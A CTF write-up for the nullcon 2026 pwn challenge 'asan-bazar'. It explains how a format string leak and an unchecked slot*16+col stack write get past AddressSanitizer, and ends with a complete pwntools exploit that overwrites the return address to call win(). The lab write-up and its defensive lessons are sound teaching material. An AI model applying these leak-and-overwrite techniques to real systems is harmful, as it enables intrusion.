# nullcon CTF 2026 — asan-bazar

**Category:** Pwn  
**Description:** *"come on in and buy some stuff of this bazar! its completly safe! its built with ASAN!"*  
**Flag:** `ENO{COMPILING_WITH_ASAN_DOESNT_ALWAYS_MEAN_ITS_SAFE!!!}`  

---

## Table of Contents

1. [Overview](#overview)
2. [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
3. [Understanding the Program](#understanding-the-program)
4. [Decompiled Code Analysis](#decompiled-code-analysis)
5. [Understanding ASAN and Shadow Bytes](#understanding-asan-and-shadow-bytes)
6. [Vulnerability Analysis](#vulnerability-analysis)
7. [Why ASAN Misses Both Bugs](#why-asan-misses-both-bugs)
8. [Understanding PIE and ASLR](#understanding-pie-and-aslr)
9. [Dynamic Analysis with GDB/pwndbg](#dynamic-analysis-with-gdbpwndbg)
10. [Exploit Development](#exploit-development)
11. [Final Exploit Script](#final-exploit-script)
12. [Key Takeaways](#key-takeaways)

---

## Overview

The challenge presents a "Goblin Bazaar" program compiled with AddressSanitizer (ASAN) enabled, implying it is memory-safe. The joke is that ASAN is not a silver bullet — it has specific blind spots that this challenge exploits. The binary contains two vulnerabilities: a **format string bug** and an **out-of-bounds stack write**. Neither is caught by ASAN.

---

## Phase 1 — Reconnaissance

### Step 1: Identify the file type

```bash
file chall
```

Output:
```
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=06364323fbfa06d62a7675546625f6e74058c9a7,
for GNU/Linux 3.2.0, not stripped
```

**What each field means:**

| Field | Meaning |
|---|---|
| `ELF 64-bit` | Linux binary, 64-bit architecture |
| `LSB` | Little-endian byte order (bytes stored lowest first) |
| `pie executable` | Position Independent Executable — loads at random address each run |
| `dynamically linked` | Uses shared libraries (libc, ASAN runtime, etc.) |
| `not stripped` | Symbol/function names are preserved — easier to reverse |

### Step 2: Check security protections

```bash
checksec --file=./chall
```

Output:
```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
ASAN:     Enabled
UBSAN:    Enabled
```

**Breaking down each protection:**

| Protection | What It Does | Status | Impact on Exploit |
|---|---|---|---|
| **Partial RELRO** | Makes some sections read-only. Partial = GOT still writable | Partial | GOT overwrite possible |
| **No Stack Canary** | No secret cookie before return address | **MISSING** | Stack smashing easier |
| **NX** | Stack not executable — no shellcode | Enabled | Must use existing code (ret2win) |
| **PIE** | Code loads at random address each run | Enabled | Must leak address first |
| **ASAN** | AddressSanitizer memory safety checks | Enabled | The false sense of security |
| **UBSAN** | Undefined Behavior Sanitizer | Enabled | Catches integer overflows etc. |

**Key observations:**
- No stack canary = no protection against return address overwrite
- PIE = need to leak a runtime address before we can compute where `win()` is
- ASAN = present but (spoiler) won't catch our specific attack

### Step 3: Find interesting functions

```bash
nm chall | grep " T " | grep -v "__\|_Z\|san\|asan\|interceptor\|sanitizer"
```

Output:
```
00000000000dc7d4 T _fini
000000000001e000 T _init
000000000001e310 T _start
00000000000dbfc0 T main
00000000000dbed0 T win
```

**`win` exists at binary offset `0xdbed0`!** In CTF pwn, a `win` function is almost always the goal. We need to redirect execution there.

### Step 4: Find interesting strings

```bash
strings chall | grep -i "flag\|cat\|bin\|exec"
```

Output:
```
/bin/cat
/flag
execve
```

Confirms: `win()` runs `/bin/cat /flag`.

### Step 5: Run the binary and observe behaviour

```bash
chmod +x ./chall
./chall
```

Interact manually:
```
=== GOBLIN BAZAAR (ASAN VERSION) ===
[bouncer] Halt! Sign the guestbook to enter.
Name: hello
[bouncer] Hah! I'll announce you to the whole market:
hello

[scribe] Welcome. Here's your item ledger entry:
  "Item: Rusty Dagger | Note: property of the Goblin Bazaar. Do not steal."

[scribe] Want to update the ledger? We write exactly what you say.
[scribe] Choose where to start (slot index 0..128): 0
[scribe] Choose a tiny adjustment inside the slot (0..15): 0
[scribe] How many bytes of ink? (max 8): 1
[scribe] Ink (raw bytes): A

[scribe] Updated ledger:
  "Atem: Rusty Dagger | Note: property of the Goblin Bazaar. Do not steal."
[bouncer] Enjoy the bazaar... and don't break anything.
```

**Program flow identified:**
1. Read name → print it back
2. Show ledger
3. Ask slot, column, length
4. Write bytes into ledger at that position
5. Show updated ledger and exit

### Step 6: Test for format string vulnerability

```bash
echo -e "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\n1\n1\n1\nA" | ./chall 2>/dev/null
```

Output (key part):
```
[bouncer] Hah! I'll announce you to the whole market:
0x7f....0x7f....0x41b58ab3.0x555555643957.0x555555630060.0x555555571730...
```

**The binary is printing memory addresses!** The name input is being used directly as the `printf` format string. This is a format string vulnerability.

---

## Understanding the Program

```
┌─────────────────────────────────────────────────┐
│              GOBLIN BAZAAR                       │
│                                                  │
│  1. Ask for your NAME                           │
│     └─> prints it back via printf(name)  ← BUG │
│                                                  │
│  2. Show you a "ledger" (item record)           │
│                                                  │
│  3. Let you "edit" the ledger:                  │
│     - Pick a SLOT (0..128)                      │
│     - Pick a COLUMN offset (0..15)              │
│     - Pick how many BYTES to write (0..8)       │
│     └─> writes your bytes to ledger[slot*16+col] ← BUG │
│                                                  │
│  4. Show updated ledger and exit                │
└─────────────────────────────────────────────────┘
```

---

## Decompiled Code Analysis

### `main()` — Entry Point

```c
int main() {
    setvbuf(stdout, NULL, _IONBF, 0);  // disable output buffering
    setvbuf(stdin, NULL, _IONBF, 0);

    greeting();   // all logic is here

    return 0;
}
```

Nothing interesting. All logic is in `greeting()`.

### `win()` — The Target

```c
void win() {
    char *argv[] = { "/bin/cat", "/flag", NULL };
    execve("/bin/cat", argv, NULL);  // prints the flag
    exit(1);
}
```

This is what we want to execute. It literally runs `/bin/cat /flag`.

### `greeting()` — Where the Bugs Live

```c
void greeting() {
    char name_buf[96];    // at stack offset +0x20 from fake stack base
    char ledger_buf[128]; // at stack offset +0xc0 from fake stack base

    // ── SETUP ──────────────────────────────────────────
    memset(name_buf, 0, 128);
    strncpy(ledger_buf, "Item: Rusty Dagger | Note: ...", 127);

    // ── INPUT 1: NAME ──────────────────────────────────
    puts("Name:");
    int bytes_read = read(0, name_buf, 127);
    name_buf[bytes_read] = '\0';
    strip_newline(name_buf);

    // ══════════════════════════════════════════════════
    // BUG #1 — FORMAT STRING VULNERABILITY
    puts("[bouncer] Hah! I'll announce you to the whole market:");
    printf(name_buf);    // <-- USER CONTROLS FORMAT STRING!
    //      ^^^^^^^^
    //      Should be: printf("%s", name_buf)
    // ══════════════════════════════════════════════════

    puts("[scribe] Welcome. Here's your item ledger entry:");
    printf("  \"%s\"\n", ledger_buf);

    // ── INPUT 2: LEDGER EDIT ───────────────────────────
    puts("[scribe] Choose where to start (slot index 0..128):");
    uint32_t slot = read_u32();
    if (slot > 128) exit(0);     // individual check ✓

    puts("[scribe] Choose a tiny adjustment inside the slot (0..15):");
    uint32_t col = read_u32();
    if (col > 15) exit(0);       // individual check ✓

    puts("[scribe] How many bytes of ink? (max 8):");
    uint32_t length = read_u32();
    if (length > 8) exit(0);     // individual check ✓

    // ══════════════════════════════════════════════════
    // BUG #2 — OUT-OF-BOUNDS STACK WRITE
    uint64_t offset = slot * 16 + col;  // NEVER CHECKED!
    // max offset = 128 * 16 + 15 = 2063 bytes!
    // ledger_buf is only 128 bytes!
    read(0, ledger_buf + offset, length);
    //         ^^^^^^^^^^^^^^^^
    //   ASAN should catch this... but doesn't (see below)
    // ══════════════════════════════════════════════════

    puts("[bouncer] Enjoy the bazaar... and don't break anything.");
    // <-- function returns here, using the return address on stack
}
```

---

## Understanding ASAN and Shadow Bytes

### What is ASAN?

ASAN (AddressSanitizer) is a compiler-based memory safety tool. It instruments every memory access in your program to check if it's valid. Think of it as a security guard standing next to every variable.

### How Shadow Memory Works

ASAN divides program memory into two regions:
- **Application memory** — your actual variables
- **Shadow memory** — a map that tracks the status of every byte

The relationship: **1 shadow byte describes 8 application bytes**.

```
APPLICATION MEMORY (your variables):
┌────┬────┬────┬────┬────┬────┬────┬────┐
│ A  │ B  │ C  │ D  │ E  │ F  │ G  │ H  │  ← 8 real bytes
└────┴────┴────┴────┴────┴────┴────┴────┘
              maps to
              ▼
SHADOW MEMORY:
┌────┐
│ ?? │  ← one shadow byte describes ALL 8 real bytes above
└────┘
```

### Shadow Byte Values

```
0x00       = ALL 8 bytes are accessible ✅
0x01..0x07 = only the first N bytes are accessible (partial access)
0xf1       = LEFT red zone  ❌
0xf2       = MIDDLE red zone ❌
0xf3       = RIGHT red zone ❌
0xf8       = stack red zone ❌
```

Any negative value (0x80-0xff) means accessing those bytes triggers ASAN abort.

### Shadow Address Formula

```
shadow_address = (application_address >> 3) + 0x7fff8000
```

Divide by 8 (because 1 shadow byte = 8 app bytes), add the shadow base offset.

### Visual Example: Stack Buffer with Red Zones

```
APPLICATION MEMORY:
[left redzone][  name_buf 96 bytes  ][redzone][  ledger_buf 128 bytes  ][right redzone]

SHADOW MEMORY (1 byte per 8 real bytes):
[  0xf1 0xf1 0xf1  ][  0x00 x12  ][  0xf2  ][  0x00 x16  ][  0xf3 0xf3 0xf3  ]
 ^^^^^^^^^^^^^^^^^    ^^^^^^^^^^    ^^^^^^    ^^^^^^^^^^^    ^^^^^^^^^^^^^^^^^
 BLOCKED! left zone   name: safe    mid zone  ledger: safe   BLOCKED! right zone
```

### How ASAN Checks Every Access

The compiler inserts this check before every memory access:

```c
// Your code:
char x = ledger_buf[200];

// What ASAN secretly adds:
shadow_addr = ((uint64_t)&ledger_buf[200] >> 3) + 0x7fff8000;
shadow_val = *shadow_addr;
if (shadow_val != 0) {
    if (shadow_val < 0) {   // negative = definite red zone
        __asan_report_load1(&ledger_buf[200]);   // PROGRAM DIES
    }
    // else: check if the specific byte within the 8-byte group is ok
}
// only if check passes: char x = ledger_buf[200];
```

This check happens for **every single read and write** in the program. That's why ASAN is slow but very effective — for the bugs it can see.

---

## Vulnerability Analysis

### Bug #1 — Format String Vulnerability

**Vulnerable code:**
```c
printf(name_buf);        // WRONG — user controls format string
printf("%s", name_buf);  // correct
```

**Why this is dangerous:**

`printf` treats the first argument as a "recipe" with special codes:

| Format Code | What printf Does |
|---|---|
| `%p` | Print next argument as a hex pointer |
| `%d` | Print next argument as a decimal integer |
| `%s` | Print next argument as a string |
| `%n` | **WRITE** the character count so far to next argument |
| `%8$p` | Print the **8th** argument specifically (positional) |

When the user inputs `%p.%p.%p`, printf reads values off the stack and prints them:

```
Input:  %p.%p.%p.%p.%p.%p.%p.%p
Output: 0x7ffff7e16643.(nil).(nil).(nil).(nil).0x41b58ab3.0x555555643957.0x555555630060
                                                                           ^^^^^^^^^^^^^^^^
                                                                           greeting() address!
```

**What this leaks:** Runtime addresses of code and stack, bypassing ASLR/PIE.

### Bug #2 — Out-of-Bounds Stack Write

**Vulnerable code:**
```c
uint32_t slot = read_u32();
if (slot > 128) exit(0);    // ✓ slot is 0..128

uint32_t col = read_u32();
if (col > 15) exit(0);      // ✓ col is 0..15

uint32_t length = read_u32();
if (length > 8) exit(0);    // ✓ length is 0..8

// NOBODY CHECKS THE COMBINED RESULT:
uint64_t offset = slot * 16 + col;    // max = 128*16+15 = 2063!
read(0, ledger_buf + offset, length); // writes up to 2063 bytes past ledger_buf!
```

**The problem:** The individual checks pass. The combined offset reaches far beyond the buffer:

```
ledger_buf[0]     ← slot=0,  col=0   → offset 0   (valid)
ledger_buf[127]   ← slot=7,  col=15  → offset 127 (last valid byte)
─────────────────────────────────────── buffer ends here (128 bytes)
ledger_buf[128]   ← slot=8,  col=0   → ALREADY OUT OF BOUNDS
...
ledger_buf[392]   ← slot=24, col=8   → THE RETURN ADDRESS! (0x188 = 392)
...
ledger_buf[2063]  ← slot=128, col=15 → maximum reachable offset
```

---

## Why ASAN Misses Both Bugs

### Bug #1 — Format String

ASAN has **zero understanding of format strings**. It only checks if memory accesses are in-bounds. The `printf` function reads from valid stack memory (the arguments), so all shadow byte checks pass. ASAN cannot know that `%p` is reading a secret address or that `%n` is writing to an unexpected location.

### Bug #2 — Out-of-Bounds Write

This is the subtle one. ASAN sets up red zones around the **ASAN fake stack** allocation. Understanding this requires understanding ASAN's stack management.

#### The ASAN Fake Stack

When ASAN is compiled with `detect_stack_use_after_return` enabled, it allocates stack variables on the **heap** instead of the real stack. But when this option is **disabled** (the default), ASAN uses a **fallback**: it carves extra space from the real stack and uses that as the "fake stack."

**The `greeting()` stack frame with ASAN fallback:**

```
Higher addresses
┌────────────────────────────┐
│     main's stack frame     │
│  [return address of main]  │
│  [saved rbp of __libc]     │
│  [main local vars]         │
├────────────────────────────┤ ← RBP of greeting = 0x7fffffffd920
│  saved RBP (main's rbp)    │ ← [RBP+0] = 0x7fffffffd940
│  return address            │ ← [RBP+8] = 0x7fffffffd928 ← TARGET
│  saved RBX                 │
│  local variables (rbx area)│ ← RBX = 0x7fffffffd840
│      ...                   │
│  [rbx+0x38] = ledger ptr   │ ← pointer TO ledger_buf
│  [rbx+0x40] = name ptr     │ ← pointer TO name_buf
│      ...                   │
├────────────────────────────┤
│  ASAN fake stack (0x160B)  │ ← RSP = stack_base = 0x7fffffffd6e0
│  [+0x000] ASAN magic       │ ← 0x41b58ab3
│  [+0x008] ASAN debug str   │
│  [+0x010] greeting() addr  │
│  [+0x020] name_buf         │ ← 96 bytes
│           [red zone]       │ ← ASAN shadow = 0xf2 (BLOCKED)
│  [+0x0c0] ledger_buf       │ ← 128 bytes ← ledger_buf
│           [red zone]       │ ← ASAN shadow = 0xf3 (BLOCKED)
│  [+0x160] END OF FAKE STACK│ ← 0x7fffffffd840
├────────────────────────────┤
```

**ASAN only poisons the red zones INSIDE the fake stack allocation.**

The fake stack spans `[0x7fffffffd6e0, 0x7fffffffd840)` — that's `0x160` bytes.

Everything above `0x7fffffffd840` (the local variables, saved RBX, saved RBP, and **return address**) is **NOT inside any ASAN allocation**. Those regions have shadow byte `0x00` (accessible) by default.

When we write to `ledger_buf + 0x188`:
```
ledger_buf         = 0x7fffffffd7a0
ledger_buf + 0x188 = 0x7fffffffd928  ← this IS the return address
```

ASAN checks the shadow byte for `0x7fffffffd928`:
```
shadow = (0x7fffffffd928 >> 3) + 0x7fff8000
```
That shadow byte was never poisoned by any ASAN allocation, so it's `0x00` = accessible. **ASAN says: "looks fine to me!"** and lets the write through.

The right red zone ends at `0x7fffffffd840` (offset `+0x160` from stack_base). The return address is at `0x7fffffffd928` (offset `+0x248` from stack_base). We skip **past** the red zone entirely by using a large slot number.

---

## Understanding PIE and ASLR

### The Problem

PIE (Position Independent Executable) means the binary loads at a different base address every run:

```
Run 1:  base = 0x555555554000,  win() = 0x55555562bed0
Run 2:  base = 0x562fff100000,  win() = 0x562fff1a5ed0
Run 3:  base = 0x7f1234560000,  win() = 0x7f12345aaed0
```

We can't hardcode `win()`'s address — it changes each run.

### The Key Insight: Offsets Never Change

Even though the base moves, the **distance between functions is fixed** (compiled into the binary):

```
win()      is always at: base + 0x0dbed0
greeting() is always at: base + 0x0dc060

win() - greeting() = 0x0dbed0 - 0x0dc060 = -0x190  ← always constant
```

So:
```
win_runtime = greeting_runtime - 0x190
```

### Leaking the Runtime Address

Using the format string bug, we print values off the stack. The stack contains code pointers (return addresses, function pointers stored by ASAN). By printing these, we get runtime addresses.

**Finding which `%N$p` position gives us `greeting()`:**

Each `%p` (or `%N$p`) reads one "argument" from the stack. In x86-64, printf arguments come from registers first (rsi, rdx, rcx, r8, r9 = positions 1-5), then from the stack (position 6 onwards):

```
%1$p = rsi register
%2$p = rdx register
%3$p = rcx register
%4$p = r8  register
%5$p = r9  register
%6$p = [RSP+0x00]  ← first stack value
%7$p = [RSP+0x08]
%8$p = [RSP+0x10]  ← greeting() address is here!
%9$p = [RSP+0x18]
...
```

We discovered through dynamic analysis that `[RSP+0x10]` contains `greeting()`'s runtime address — ASAN stores it there as part of its stack debug metadata.

---

## Dynamic Analysis with GDB/pwndbg

This section shows the actual debugging commands used to understand the stack layout.

### Setup

```bash
gdb ./chall
```

### Set a breakpoint at the printf call in greeting()

```
(gdb) break *greeting+557
(gdb) run
```

Provide input `AAAA` when prompted for name.

### Examine registers

```
(gdb) info registers
```

Key values:
```
RBX = 0x7fffffffd840    ← greeting's local variable frame
RBP = 0x7fffffffd920    ← frame pointer
RSP = 0x7fffffffd6e0    ← stack pointer (= ASAN fake stack base)
RDI = 0x7fffffffd700    ← name buffer (format string = our input)
```

### Calculate key offsets

```
(gdb) p/x $rbp - $rsp
$1 = 0x240              ← total frame size
(gdb) p/x $rbp + 8
$2 = 0x7fffffffd928     ← address where return addr is stored
(gdb) x/gx $rbp+8
0x7fffffffd928: 0x0000555555630052   ← return addr = main+146
```

### View the entire stack frame

```
(gdb) x/80gx $rsp
```

This dumps 80 quad-words (8 bytes each) from RSP. Annotated key findings:

```
0x7fffffffd6e0: 0x0000000041b58ab3   ← [RSP+0x00] ASAN magic value
0x7fffffffd6e8: 0x0000555555643957   ← [RSP+0x08] ASAN debug string ptr
0x7fffffffd6f0: 0x0000555555630060   ← [RSP+0x10] greeting() address! (%8$p)
0x7fffffffd6f8: 0x0000555555571730   ← [RSP+0x18] binary address
0x7fffffffd700: 0x0000550041414141   ← [RSP+0x20] "AAAA" = our name input (name_buf)
...
0x7fffffffd7a0: 0x6d6574493a6d6574   ← [RSP+0xc0] "Item:..." = ledger_buf
...
0x7fffffffd920: 0x00007fffffffd940   ← [RBP+0x00] saved RBP
0x7fffffffd928: 0x0000555555630052   ← [RBP+0x08] RETURN ADDRESS ← TARGET
```

### Calculate offset from ledger_buf to return address

```
(gdb) p/x 0x7fffffffd928 - 0x7fffffffd7a0
$3 = 0x188
```

Offset = `0x188` = 392 decimal.

Converting to slot/col:
```
slot = 0x188 / 16 = 24
col  = 0x188 % 16 = 8
```

### Verify the format string leak positions

```bash
# Find which %N$p gives greeting():
echo -e "%8\$p\n1\n1\n1\nA" | ./chall 2>/dev/null | head -5
# Should output: 0x555555630060 (or similar)
```

```bash
# Verify it changes with ASLR each run:
echo -e "%8\$p\n1\n1\n1\nA" | ./chall 2>/dev/null | head -5
echo -e "%8\$p\n1\n1\n1\nA" | ./chall 2>/dev/null | head -5
# Different addresses each time, but always end in ...060
```

### Verify the return address position

```bash
# %79$p should be [RSP+0x248] which is where return addr lives
# (when stack alignment P=24)
echo -e "%8\$p.%79\$p\n1\n1\n1\nA" | ./chall 2>/dev/null | head -5
# If %79$p = %8$p - 0xe, then it's main+146 = return address confirmed
```

### Verify win() offset

```bash
# win is at offset 0xdbed0, greeting at 0xdc060
# difference:
python3 -c "print(hex(0xdbed0 - 0xdc060))"
# Output: -0x190 (win is 0x190 bytes BEFORE greeting)
```

### Checking ASAN shadow bytes (confirm unprotected region)

In GDB, you can manually check shadow bytes for any address:

```
(gdb) p/x (0x7fffffffd928 >> 3) + 0x7fff8000
$4 = 0x107fff7b25   ← shadow address for return addr
(gdb) x/1bx 0x107fff7b25
... = 0x00            ← shadow = 0x00 = ACCESSIBLE, no protection!
```

Compare with the red zone:

```
(gdb) p/x (0x7fffffffd820 >> 3) + 0x7fff8000
$5 = 0x107fff7b04   ← shadow for the right red zone
(gdb) x/1bx 0x107fff7b04
... = 0xf3            ← shadow = 0xf3 = RED ZONE, ASAN would block this
```

This confirms: writing to ledger_buf+0x188 (the return address) is **not** blocked by ASAN.

---

## Exploit Development

### Attack Plan

```
┌─────────────────────────────────────────────────────────┐
│  GOAL: make greeting() return to win() instead of main  │
└─────────────────────────────────────────────────────────┘

Step 1: Use format string to LEAK addresses
        %8$p  → greeting() runtime address
        %77$p → candidate return addr (if stack alignment P=8)
        %79$p → candidate return addr (if stack alignment P=24)

Step 2: Calculate win()'s address
        win = greeting_leaked - 0x190

Step 3: Identify the EXACT return address offset
        One of the candidates will equal greeting - 0xe (= main+146)
        That tells us which alignment case we're in

Step 4: Use out-of-bounds write to overwrite the return address
        slot = ret_offset / 16
        col  = ret_offset % 16
        length = 8
        data = p64(win_addr)

Step 5: greeting() executes `ret`
        CPU reads our win() address from the stack
        Jumps to win() → execve("/bin/cat", ["/bin/cat", "/flag"])
        FLAG!
```

### Why Two Candidate Positions?

The stack alignment at runtime depends on the initial RSP value from the OS. The `and rsp, ~0x1f` instruction in `greeting()` aligns to 32 bytes, and depending on the starting RSP:

- If `(M-24) % 32 == 8`: alignment padding P=8, return addr at offset **0x178** from ledger_buf
- If `(M-24) % 32 == 24`: alignment padding P=24, return addr at offset **0x188** from ledger_buf

(Where M = RSP value when `call greeting` executes in main)

To handle both cases robustly, we:
1. Leak both candidates (`%77$p` and `%79$p`)
2. Check which equals `main+146 = greeting - 0xe`
3. Use the matching offset

### Stack Layout at Time of `ret` (After Our Write)

```
BEFORE exploit:                    AFTER exploit:
┌──────────────┐                   ┌──────────────┐
│  ledger data │                   │  ledger data │
│  (128 bytes) │                   │  (128 bytes) │
├──────────────┤                   ├──────────────┤
│  ...locals...│                   │  ...locals...│
├──────────────┤                   ├──────────────┤
│  saved RBP   │                   │  saved RBP   │
├──────────────┤                   ├──────────────┤
│ return addr  │  ── overwrite ──► │  win() addr  │  ← CHANGED!
│ (main+146)   │                   │  0x...5ed0   │
└──────────────┘                   └──────────────┘
       │                                  │
  `ret` reads                        `ret` reads
  return addr                        return addr
       │                                  │
       ▼                                  ▼
  back to main                      jumps to win()
  (normal exit)                     cat /flag → FLAG!
```

### Understanding `p64(win_addr)` — Little-Endian

x86-64 stores multi-byte values in **little-endian** format (least significant byte first):

```
win_addr = 0x0000562fff1a5ed0

Memory layout (lowest address first):
Address+0: 0xd0  ← least significant byte
Address+1: 0x5e
Address+2: 0x1a
Address+3: 0xff
Address+4: 0x2f
Address+5: 0x56
Address+6: 0x00
Address+7: 0x00  ← most significant byte
```

`p64(win_addr)` from pwntools produces exactly these 8 bytes in the right order.

---

## Final Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = '52.59.124.14'
PORT = 5030

def exploit():
    if args.LOCAL:
        p = process('./chall')
    else:
        p = remote(HOST, PORT)

    # ── STEP 1: LEAK ADDRESSES VIA FORMAT STRING ──────────────────
    # %8$p  = greeting() runtime address    → [RSP+0x10]
    # %77$p = [RSP+0x238] candidate retaddr (alignment case P=8)
    # %79$p = [RSP+0x248] candidate retaddr (alignment case P=24)
    payload = b'%8$p.%77$p.%79$p'
    p.sendafter(b'Name:', payload + b'\n')

    p.recvuntil(b'market:\n')
    line = p.recvline().strip()
    log.info(f"Raw leak: {line}")

    parts = line.split(b'.')
    greeting_addr = int(parts[0], 16)
    cand_178      = int(parts[1], 16)   # value at [RSP+0x238]
    cand_188      = int(parts[2], 16)   # value at [RSP+0x248]

    # ── STEP 2: CALCULATE WIN ADDRESS ─────────────────────────────
    win_addr     = greeting_addr - 0x190   # win is always 0x190 before greeting
    expected_ret = greeting_addr - 0xe     # main+146 is always greeting - 0xe

    log.info(f"greeting   @ {hex(greeting_addr)}")
    log.info(f"win        @ {hex(win_addr)}")
    log.info(f"expect ret = {hex(expected_ret)}")

    # ── STEP 3: DETERMINE EXACT RETURN ADDRESS OFFSET ─────────────
    # Whichever candidate matches main+146 tells us the alignment case
    if cand_178 == expected_ret:
        ret_offset = 0x178   # alignment P=8
        log.success("Alignment P=8: ret_offset = 0x178")
    elif cand_188 == expected_ret:
        ret_offset = 0x188   # alignment P=24
        log.success("Alignment P=24: ret_offset = 0x188")
    else:
        log.error("Neither candidate matched! Unexpected stack layout.")
        p.close()
        return

    # Convert offset to slot and column
    slot = ret_offset // 16   # integer division
    col  = ret_offset % 16    # remainder
    log.info(f"slot={slot}, col={col}, length=8")

    # ── STEP 4: OVERWRITE RETURN ADDRESS VIA LEDGER WRITE ─────────
    p.sendlineafter(b'(slot index 0..128):', str(slot).encode())
    p.sendlineafter(b'(0..15):', str(col).encode())
    p.sendlineafter(b'(max 8):', b'8')
    p.sendlineafter(b'Ink (raw bytes):', p64(win_addr))
    # read(0, ledger_buf + ret_offset, 8) writes win_addr over return address

    # ── STEP 5: RECEIVE THE FLAG ──────────────────────────────────
    # greeting() hits `ret`, jumps to win(), which runs cat /flag
    data = p.recvall(timeout=5)
    log.success(f"Output:\n{data.decode(errors='replace')}")
    p.interactive()

if __name__ == '__main__':
    exploit()
```

### Running It

```bash
# Against remote server:
python3 exploit.py

# Against local binary (for testing):
python3 exploit.py LOCAL
```

### Sample Output

```
[+] Opening connection to 52.59.124.14 on port 5030: Done
[*] Raw leak: b'0x562fff1a6060.0x7ffe725c5218.0x562fff1a6052'
[*] greeting   @ 0x562fff1a6060
[*] win        @ 0x562fff1a5ed0
[*] expect ret = 0x562fff1a6052
[+] Alignment P=24: ret_offset = 0x188
[*] slot=24, col=8, length=8
[+] Output:
    [bouncer] Enjoy the bazaar... and don't break anything.
    ENO{COMPILING_WITH_ASAN_DOESNT_ALWAYS_MEAN_ITS_SAFE!!!}
```

---

## Key Takeaways

### 1. ASAN is not a complete security solution

ASAN protects the memory regions it **knows about**. It cannot protect:
- Format string vulnerabilities (it doesn't understand printf semantics)
- Memory outside its managed allocations (like the return address above the fake stack)

### 2. The "fake stack" lives on the real stack

When `detect_stack_use_after_return=0` (default), ASAN's fake stack is allocated by moving RSP down on the **real** stack. This means there's a gap between the end of the ASAN-managed region and the return address, and that gap has no protection.

### 3. Bounds checking the inputs is not the same as bounds checking the output

```c
if (slot > 128) exit(0);     // checks slot ✓
if (col > 15) exit(0);       // checks col ✓
// but never checks: if (slot * 16 + col > sizeof(ledger_buf)) exit(0);
```

Always validate the **combined result** of arithmetic on user inputs, not just the individual inputs.

### 4. Format strings are a classic but still alive

`printf(user_input)` instead of `printf("%s", user_input)` is a 30-year-old bug class that still appears in CTFs and real software. The compiler usually warns about it with `-Wformat-security`.

### 5. PIE/ASLR can be bypassed with information leaks

If any pointer to the binary gets printed (via format string, debug output, error message), an attacker can calculate the base address and defeat ASLR. Leaking one address leaks everything.

### 6. Exploit development is systematic

```
Recon → Understand → Find bugs → Understand mitigations
→ Find gaps in mitigations → Build leak primitive
→ Build write primitive → Chain them → Flag
```

Every step builds on the previous one. Patience and methodical analysis always win.

---

*Written for educational purposes as part of nullcon CTF 2026.*
